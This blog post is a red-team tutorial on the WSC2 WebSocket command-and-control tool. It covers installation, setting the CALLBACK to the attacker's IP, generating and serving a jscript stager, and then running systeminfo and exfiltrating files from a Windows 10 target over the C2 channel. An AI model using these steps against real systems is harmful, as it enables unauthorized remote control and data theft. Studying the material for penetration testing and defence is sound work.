<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Command &amp; Control: WebSocket C2</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/websocket-c2-command-control/" rel="bookmark"><time class="entry-date published" datetime="2019-04-14T06:30:29+00:00">April 14, 2019</time><time class="updated" datetime="2025-05-13T09:32:09+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn how to use WebSocket C2 tool. It is also known as WSC2.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction</span></li>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Exploiting Target</span></li>
<li><span style="color: #000000;">Command Execution</span></li>
<li><span style="color: #000000;">File Download</span></li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span></span></h3>
<p><span style="color: #000000;">WSC2 is primarily a tool for post-exploitation. WSC2 uses the WebSocket and a browser process. This serves as a C2 communication channel between an agent, running on the target system, and a controller acting as the actual C2 server. This tool is developed using python. The credit for developing this tool goes to <a style="color: #000000;" href="//twitter.com/Arno0x0x">Arno0x0x</a>.</span></p>
<p><span style="color: #000000;">For this particular demonstration,</span></p>
<p><span style="color: #000000;"><strong>Attacker:</strong> Kali Linux</span></p>
<p><span style="color: #000000;"><strong>Target:</strong> Windows 10</span></p>
<h3><span style="color: #800000;">Installation</span></h3>
<p><span style="color: #000000;">To begin, first we need the tool on our Attacker Machine. To do this, we will clone the tool directly from the GitHub.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone //github.com/Arno0x/WSC2.git</pre>
<p><img fetchpriority="high" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-msKvxO8Zo8s/XLLPni9rrPI/AAAAAAAAd_c/89v7lk2mnYURaPv_E71rVtxcskzLWbsnQCLcBGAs/s1600/1.png" alt="WebSocket C2 Command and Control" width="575" height="95"/></p>
<p><span style="color: #000000;">After running the above command, we would have a directory created by the name of WSC2. Now, we will traverse inside that directory using the cd command. Let’s see the contents of the directory that we just cloned using the ls command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd WSC2/
ls</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-1kUgW4ani6Y/XLLPojDqbWI/AAAAAAAAd_s/GlIBX0Gm0a0a1hW1zPT3xkE408W9Ja4ywCLcBGAs/s1600/2.png"/></p>
<p><span style="color: #000000;">After that we are going to need to install the dependencies of the tool. There are multiple ways to do this, but here we are using pip command along with a requirements.txt file that we cloned from git earlier.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip install -r requirements.txt</pre>
<p><img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-lcfJTvIKal0/XLLPotwEl0I/AAAAAAAAd_w/Jq0XaMIN6XMdKJru548GbznZRoVPhSgjACLcBGAs/s1600/3.png" alt="WebSocket C2 Command and Control" width="484" height="96"/></p>
<p><span style="color: #000000;">As we saw earlier that we have a config.py file inside the cloned directory. We have to make some changes inside this config.py file so as to get the session on our system. We used nano to edit the file. As shown in the figure, when we opened the config.py file using nano, we found a variable CALLBACK. It has an IP Address. We changed it to the IP Address of our Attacker Machine i.e Kali Linux.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano config.py</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-qkkUMTtO8hw/XLLPpfJANCI/AAAAAAAAd_0/qmvERIIE3IcHRc_61jv2h_iINLs_DwbewCLcBGAs/s1600/4.png"/></p>
<h3><span style="color: #800000;">Exploiting Target</span></h3>
<p><span style="color: #000000;">Now, it’s time to run the tool, check for appropriate permission before running the tool. As we run the tool, a cool looking banner greets us as shown in the given below. Followed by some details about the Author and Version and tool. After this, it will create an incoming directory inside the Directory we cloned earlier. This will be used as a buffer to save files from the target.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./wsc2.py</pre>
<p><img decoding="async" class="alignnone" src="//1.bp.blogspot.com/-eD3eW_bwuxw/XLLPpXl0G5I/AAAAAAAAd_4/3N8dTc0_CfojSKQVWpm__Wozp-9Z985yQCLcBGAs/s1600/5.png" alt="WebSocket C2 Command and Control" width="622" height="324"/></p>
<p><span style="color: #000000;">We are going to create a batch file. But we can use many other types of stager options. This tool provides stager in jscript1, jscript2, jscript3. We are using jscript1 here because it is not required to compile. Rest of the stagers are required to compile. This command will create a wsc2Agent1.js in stagers directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">genStager jscript1</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-k825eeg2lvY/XLLPpl0a9dI/AAAAAAAAd_8/MJ-A9oEBkqogNam9upFeAvK-cCLybyOqgCLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">Now let’s get the file to the target machine. To do this we will open up a new terminal and traverse into the stagers directory using the cd command. Here, we are using the python server to share the file to the target. This can be done using any other method of choice.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd stagers/
ls
python -m SimpleHTTPServer 80</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-SjXy33E65Tc/XLLPqUZfyLI/AAAAAAAAeAA/XAxrxNleS2g1v3vFxRQWXVglZpBgJKW1ACLcBGAs/s1600/7.png" alt="WebSocket C2 Command and Control" width="524" height="116"/></p>
<p><span style="color: #000000;">After the target machine executes the jscript file, a message will inform us on the terminal that a New agent connected. Now we will use the list command to see the list of the agents.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">list</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-pHQvT8agSVM/XLLPqhw-TxI/AAAAAAAAeAI/nSfdEn0UoCMwIpAuw9pKMHQfqJMbAvINwCLcBGAs/s1600/8.png"/></p>
<p><span style="color: #000000;">And then we will copy the AgentID and then use it to interact with the session as shown in the given image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use [AgentID]</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-XajBdI062yI/XLLPqVcaDpI/AAAAAAAAeAE/rcIeOUR-908vNrL0tagRnlrBWdjn2GyeACLcBGAs/s1600/9.png"/></p>
<h3><span style="color: #800000;">Command Execution</span></h3>
<p><span style="color: #000000;">We can run some PowerShell commands on the target machine using the command cli. Here we run the command systeminfo. And we have the system information of the target as shown in the given image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cli
systeminfo</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-IuK_Drn8lrQ/XLLPniQGEXI/AAAAAAAAd_g/eUo_8z4pZq8gA6jx4G4j9EBA2tL7mh5cwCLcBGAs/s1600/10.png" alt="WebSocket C2 Command and Control" width="498" height="204"/></p>
<h3><span style="color: #800000;">File Download</span></h3>
<p><span style="color: #000000;">Furthermore, we can download files from the target. To do this we will have to use the command getFile followed by the file name or path. This will download the file form the target to our attacker machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">help getFile
getFile sample_text.txt</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-uiFwbJBF_7k/XLLPnn0Yj6I/AAAAAAAAd_k/PAs6eXcyq2kXoIXTbVFP5GkRrCMO6O-EgCLcBGAs/s1600/11.png"/></p>
<p><span style="color: #000000;">The tool will download the file inside the incoming directory we discussed earlier. We can view the file using cat command as shown in the image given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd incoming/
ls
cat sample_file.txt</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-wH97PCLxEQQ/XLLPolQTbrI/AAAAAAAAd_o/2a49Kh0ajn0BBALaNcGy2PMpITMzb7KKwCLcBGAs/s1600/12.png" alt="WebSocket C2 Command and Control" width="537" height="93"/></p>
<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
<p><strong><span style="color: #000000;">Author: Pavandeep Singh</span></strong><span style="color: #000000;"> is a Technical Writer, Researcher and Penetration Tester Contact</span> <strong><a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.linkedin.com/in/pavandeep-singh-6b1074132&amp;source=gmail&amp;ust=1542651210170000&amp;usg=AFQjCNEYOzlThg6B1HzKcEZNou4HowCJ2Q">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
